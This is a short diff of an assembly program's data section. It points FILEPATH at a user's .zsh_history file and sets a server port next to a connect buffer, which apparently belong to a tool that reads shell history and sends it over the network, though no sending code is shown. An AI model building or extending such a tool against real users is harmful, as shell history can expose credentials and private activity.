@@ -101,5 +101,5 @@ STATBUFFER		times 144 db 0
 CONNECT_BUFFER	times 16 db 0
 ; FILEPATH		times 1024 db 0
 FILEPATH		db '/home/maxence/.zsh_history', 0
-SERVER_PORT		dd 0x0
+SERVER_PORT		dd 0xba0b
 SERVER_ADDR		dw 0x0
